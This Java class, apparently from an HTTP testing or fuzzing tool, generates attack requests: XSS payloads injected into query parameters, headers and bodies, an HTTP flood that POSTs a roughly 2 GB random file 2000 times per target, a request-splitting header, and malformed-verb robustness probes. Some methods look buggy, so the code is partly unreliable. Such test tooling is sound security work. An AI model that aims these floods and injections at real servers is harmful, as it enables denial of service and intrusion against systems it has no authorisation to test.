import model.InOutRule;
import model.OutInRule;
import model.Request;
import model.Rule;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.http.HttpRequest;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Attacker {
    private List<String> scripts;
    private List<Rule> rules;
    private List<Rule> attackRules;

    public Attacker(List<Rule> rules) {
        this.attackRules = new ArrayList<>();
        this.rules = new ArrayList<>();
        this.rules.addAll(rules);
        this.scripts = new ArrayList<>();
        scripts.add("<script>alert('XSS')</script>");
        scripts.add("<img src=javascript:alert('XSS')>");
        scripts.add("</script><script>alert('XSS')</script>");
        scripts.add("<svg onload=alert('XSS')>");
    }

    public void attack() {
        for(Rule rule: attackRules) {
            new OutputRequest((OutInRule) rule).start();
        }
    }

    public void XSSAttacks() {
        XSSQueryParams();
        for(String script: scripts) {
            XSSHeaders(script);
            XSSBody(script);
        }
    }

    private void XSSQueryParams() {
        Pattern pattern = Pattern.compile("(.*\\?)([^=]*=.*)");
        Matcher matcher;
        String[] params;
        String path;
        Map<String,String> paramMap = new LinkedHashMap<>();
        Set<Map.Entry<String, String>> paramSet;
        Iterator<Map.Entry<String, String>> it;
        for(Rule rule: rules) {
            paramMap.clear();
            if(rule instanceof InOutRule) {
                continue;
            }
            matcher = pattern.matcher(rule.getRequest().getPath());
            if(matcher.find()) {
                params = matcher.group(2).split("&");
            } else return;
            for(String param: params) {
                paramMap.put(param.split("=")[0],"");
            }
            paramSet = paramMap.entrySet();
            it = paramSet.iterator();
            path = matcher.group(1);
            while(it.hasNext()) {
                Map.Entry<String, String> e = it.next();
                path = path.concat(e.getKey() + "=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E&");
            }
            path = path.substring(0,path.length()-1);
            attackRules.add(new OutInRule(new Request(rule.getRequest().getMethod(),path,rule.getRequest().getHeaders(),rule.getRequest().getBody()), null, 0L, 1, 0L));
        }
    }

    private void XSSHeaders(String script) {
        Map<String, String> headersMap = new HashMap<>();
        for(Rule rule: rules) {
            if (rule instanceof InOutRule) {
                continue;
            }
            if (rule.getRequest().getHeaders().size() != 0) {
                for (String k : rule.getRequest().getHeaders().keySet()) {
                    headersMap.put(k, script);
                }
                attackRules.add(new OutInRule(new Request(rule.getRequest().getMethod(), rule.getRequest().getPath(), headersMap, rule.getRequest().getBody()), null, 0L, 1, 0L));
            } else return;
        }
    }

    private void XSSBody(String script) {
        for(Rule rule: rules) {
            if(rule instanceof InOutRule) {
                continue;
            }
            String body = rule.getRequest().getBody();
            if(!body.equals("")){
                body = script;
                attackRules.add(new OutInRule(new Request(rule.getRequest().getMethod(), rule.getRequest().getPath(), rule.getRequest().getHeaders(), body), null, 0L, 1, 0L));
            } else return;
        }
    }

    private void generateBigFile() throws IOException {
        int maxSize = Integer.MAX_VALUE;
        String allowedCharacters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        StringBuilder sbRandomString = new StringBuilder(maxSize);
        Random random = new Random();
        for (int i = 0; i < maxSize; i++) {
            int randomInt = random.nextInt(allowedCharacters.length());
            sbRandomString.append(allowedCharacters.charAt(randomInt));
        }
        String randomString = sbRandomString.toString();
        FileOutputStream FosBigFile = new FileOutputStream("bigFileHttpFlood.txt");
        FosBigFile.write(randomString.getBytes());
        FosBigFile.close();
    }

    private String readFile(File fileName) throws IOException {
        FileInputStream Fis = new FileInputStream(fileName);
        StringBuilder sbContent = new StringBuilder();
        int chr;
        while ((chr = Fis.read()) != -1) {
            sbContent.append((char) chr);
        }
        Fis.close();
        return sbContent.toString();
    }

    private List<String> getIpAddresses() {
        List<String> ipAddresses = new ArrayList<>();
        for (Rule rule : rules) {
            if (rule instanceof InOutRule) {
                continue;
            }
            Pattern pattern = Pattern.compile("(([0-9]{1,3}.){3}[0-9]{1,3})");
            Matcher matcher = pattern.matcher(rule.getRequest().getPath());
            ipAddresses.add(matcher.group(1));
        }
        return ipAddresses;
    }

    public void httpFloodAttack() throws IOException {
        File bigFile = new File("bigFileHttpFlood.txt");
        String content;
        if (bigFile.exists()){
            content = readFile(bigFile);
        } else {
            generateBigFile();
            content = readFile(bigFile);
        }
        for (String ipAddress : getIpAddresses()) {
            attackRules.add(new OutInRule(new Request("POST", ipAddress, null, content), null, 0L, 2000, 0L));
        }
    }

    public void requestSplittingAttack() throws URISyntaxException {
        Map<String, String> headers = new HashMap<>();
        headers.put("Transfert-Encoding", "chunked\r\n\r\n0\r\n\r\n");
        for (String ipAddress : getIpAddresses()) {
            Request reqToInject = new Request("POST", ipAddress, null, "HTTP Request Splitting Attack");
            HttpRequest.Builder builder = HttpRequest.newBuilder()
                    .method(reqToInject.getMethod(), HttpRequest.BodyPublishers.ofString(reqToInject.getBody()))
                    .uri(new URI(reqToInject.getPath()));
            String encodedReq = builder.build().toString();
            attackRules.add(new OutInRule(new Request("POST", ipAddress, headers, encodedReq), null, 0L, 1, null));
        }
    }

    //----- ROBUSTNESS ATTACKS -----
    public void robustnessAttacks() {
        verbNotExist();
        emptyVerb();
        specialChar();
    }

    private void verbNotExist() {
        for (String ipAddress : getIpAddresses()) {
            attackRules.add(new OutInRule(new Request("wrongVerb", ipAddress, null, null), null, 0L, 1, null));
        }
    }

    private void emptyVerb() {
        for (String ipAddress : getIpAddresses()) {
            attackRules.add(new OutInRule(new Request("", ipAddress, null, null), null, 0L, 1, null));
        }
    }

    private void specialChar() {
        Map<String, String> headers = new HashMap<>();
        headers.put("~`^@=+*", "$€£¤ø");
        for (String ipAddress : getIpAddresses()) {
            attackRules.add(new OutInRule(new Request("&'ƒ#%Šµ", ipAddress, headers, null), null, 0L, 1, null));
        }
    }
}
